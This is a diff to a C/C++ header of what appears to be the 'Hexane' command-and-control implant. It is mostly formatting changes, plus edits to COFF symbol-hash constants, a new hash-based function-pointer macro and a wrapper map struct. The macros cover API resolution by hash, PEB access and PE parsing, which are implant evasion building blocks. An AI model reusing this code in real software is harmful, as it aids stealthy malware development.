@@ -21,7 +21,7 @@ EXTERN_C LPVOID InstEnd();
 #define WIN_VERSION_2016_X                          11
 
 #define MAX_PATH 								    260
-#define PIPE_BUFFER_MAX     					    (64 * 1000 - 1)
+#define PIPE_BUFFER_MAX  				            (64 * 1000 - 1)
 #define MIN(a,b)								    (a < b ? a : b)
 
 #define GLOBAL_OFFSET								(U_PTR(InstStart()) + U_PTR(&__instance))
@@ -52,25 +52,24 @@ EXTERN_C LPVOID InstEnd();
 
 #define PEB_POINTER64							    (R_CAST(PPEB, __readgsqword(0x60)))
 #define PEB_POINTER32							    (R_CAST(PPEB, __readfsdword(0x30)))
-#define REG_PEB32(ctx) 						        (R_CAST(LPVOID, R_CAST(ULONG_PTR, ctx.Ebx) + 0x8))
-#define REG_PEB64(ctx) 						        (R_CAST(LPVOID, R_CAST(ULONG_PTR, ctx.Rdx) + 0x10))
+#define REG_PEB32(Ctx) 						        (R_CAST(LPVOID, R_CAST(ULONG_PTR, Ctx.Ebx) + 0x8))
+#define REG_PEB64(Ctx) 						        (R_CAST(LPVOID, R_CAST(ULONG_PTR, Ctx.Rdx) + 0x10))
 
 #define DOS_HEADER(base)                    		(R_CAST(PIMAGE_DOS_HEADER, base))
 #define NT_HEADERS(base, dos)			    		(R_CAST(PIMAGE_NT_HEADERS, B_PTR(base) + dos->e_lfanew))
 #define EXPORT_DIRECTORY(dos, nt)	        		(R_CAST(PIMAGE_EXPORT_DIRECTORY, (U_PTR(dos) + (nt)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress)))
-#define SECTION_HEADER(data, i)   		    		(R_CAST(PIMAGE_SECTION_HEADER, U_PTR(data) + sizeof(IMAGE_FILE_HEADER) + U_PTR(sizeof(IMAGE_SECTION_HEADER) * i)))
-#define RELOC_SECTION(b, r) 						(R_CAST(_reloc*, C_PTR(U_PTR(b) + r)))
+#define SECTION_HEADER(data, i)   		            (R_CAST(PIMAGE_SECTION_HEADER, U_PTR(data) + sizeof(IMAGE_FILE_HEADER) + U_PTR(sizeof(IMAGE_SECTION_HEADER) * i)))
+#define RELOC_SECTION(b, r) 			            (R_CAST(_reloc*, C_PTR(U_PTR(b) + r)))
 #define SEC_START(map, index)                       (U_PTR(map[index].address))
 #define SEC_END(map, index)                         (U_PTR(map[index].address + map[index].size))
 
-#define RVA(Ty, base, rva)  					    (R_CAST(Ty, U_PTR(base) + rva))
-#define NtCurrentProcess()              		    (R_CAST(HANDLE, S_CAST(LONG_PTR, -1)))
-#define NtCurrentThread()               		    (R_CAST(HANDLE, S_CAST(LONG_PTR, -2)))
+#define RVA(Ty, base, rva)  			            (R_CAST(Ty, U_PTR(base) + rva))
+#define NtCurrentProcess()              	        (R_CAST(HANDLE, S_CAST(LONG_PTR, -1)))
+#define NtCurrentThread()               	        (R_CAST(HANDLE, S_CAST(LONG_PTR, -2)))
 
-#define ARRAY_LEN(ptr) 							    sizeof(ptr) / sizeof(ptr[0])
-#define PAGE_ALIGN(x)  							    (B_PTR(U_PTR(x) + ((4096 - (U_PTR(x) & (4096 - 1))) % 4096)))
-#define DYN_ARRAY_LEN(i, ptr) 					    while (true) { if (!ptr[i]) { if (i > 0) { i -= 1; } break; __asm(""); } else { i++; }}
-#define IMAGE_REL_TYPE(x, y)  					    IMAGE_REL_##x##_##y
+#define ARRAY_LEN(ptr) 				                sizeof(ptr) / sizeof(ptr[0])
+#define PAGE_ALIGN(x)  				                (B_PTR(U_PTR(x) + ((4096 - (U_PTR(x) & (4096 - 1))) % 4096)))
+#define DYN_ARRAY_LEN(i, ptr) 			            while (true) { if (!ptr[i]) { if (i > 0) { i -= 1; } break; __asm(""); } else { i++; }}
 
 // todo: hash COFF_PREP_SYMBOL, BEACON_SYMBOL and GLOBAL_CONTEXT names
 #ifdef _M_X64
@@ -83,14 +82,9 @@ EXTERN_C LPVOID InstEnd();
 	#define IMAGE_OPT_MAGIC 					    IMAGE_NT_OPTIONAL_HDR64_MAGIC
 	#define MACHINE_ARCH    					    IMAGE_FILE_MACHINE_AMD64
 
-// __impl_HASHNAME					; already loaded
-// __impl_HexaneHASHNAME			; internal function
-// __impl_CRYPT32$HASHNAME			; loadable
-
-	#define COFF_PREP_SYMBOL        			    0xec6ba2a8 	// __impl_
-	#define COFF_PREP_SYMBOL_SIZE   			    7
-	#define COFF_PREP_BEACON        			    0xd0a409b0  // __impl_Hexane
-	#define COFF_PREP_BEACON_SIZE   			    (COFF_PREP_SYMBOL_SIZE + 6)
+	#define COFF_IMPL_HASH      					0x00000001	// __impl_
+	#define COFF_INCL_HASH      					0x00000002	// __impl_$
+	#define COFF_HEXANE_HASH    					0x00000003	// __impl_Hexane
 	#define GLOBAL_CONTEXT           			    0xbfded9c9  // .refptr.__instance
 #elif _M_IX86
 	#define IP_REG									Eip
@@ -102,15 +96,10 @@ EXTERN_C LPVOID InstEnd();
 	#define IMAGE_OPT_MAGIC 						IMAGE_NT_OPTIONAL_HDR32_MAGIC
 	#define MACHINE_ARCH    						IMAGE_FILE_MACHINE_I386
 
-// __impl__HASHNAME					; already loaded
-// __impl__HexaneHASHNAME			; internal function
-// __impl__CRYPT32$HASHNAME			; loadable
-
-    #define COFF_PREP_SYMBOL        				0x79dff807	// __impl__
-    #define COFF_PREP_SYMBOL_SIZE   				8
-    #define COFF_PREP_BEACON        				0x4c20aa4f	// __impl__Hexane
-    #define COFF_PREP_BEACON_SIZE   				(COFF_PREP_SYMBOL_SIZE + 6)
-    #define GLOBAL_CONTEXT           				0xb341b5b9	// __instance
+	#define COFF_IMPL_HASH      					0x00000001 	// __impl__
+	#define COFF_INCL_HASH      					0x00000002	// __impl__$
+	#define COFF_HEXANE_HASH    					0x00000003	// __impl__Hexane
+	#define GLOBAL_CONTEXT           			    0xbfded9c9  // __instance
 #endif
 
 #define EGRESS 										0
@@ -170,6 +159,7 @@ EXTERN_C LPVOID InstEnd();
 
 #define F_PTR_HMOD(Fn, hmod, sym_hash)				(Fn = (decltype(Fn)) Memory::Modules::GetExportAddress(hmod, sym_hash))
 #define F_PTR_HASHES(Fn, mod_hash, sym_hash)		(Fn = (decltype(Fn)) Memory::Modules::GetExportAddress(Memory::Modules::GetModuleAddress(Memory::Modules::GetModuleEntry(mod_hash)), sym_hash))
+#define V_PTR_HASHES(Fn, mod_hash, sym_hash)		(Fn = (void*) Memory::Modules::GetExportAddress(Memory::Modules::GetModuleAddress(Memory::Modules::GetModuleEntry(mod_hash)), sym_hash))
 #define M_PTR(mod_hash)								Memory::Modules::GetModuleAddress(Memory::Modules::GetModuleEntry(mod_hash))
 #define NT_ASSERT(Fn)								Fn; if (NtCurrentTeb()->LastErrorValue != ERROR_SUCCESS) return
 
@@ -391,6 +381,11 @@ struct _command_map{
 	_command 	address;
 };
 
+struct _hash_map{
+	uint32_t    name;
+	void		*address;
+};
+
 struct LdrpVectorHandlerEntry {
     LdrpVectorHandlerEntry 		*flink;
     LdrpVectorHandlerEntry 		*blink;
@@ -445,7 +440,7 @@ struct _hexane{
     BOOL   	little;
 
 	_executable *coffs;
-	_client *clients;
+	_client 	*clients;
 
 	struct {
 		UINT_PTR    address;
@@ -664,6 +659,8 @@ struct _hexane{
 		__prototype(InitializeAcl);
 		__prototype(FreeSid);
 	} win32;
+
+	_hash_map 	wrappers[];
 };
 
 #endif
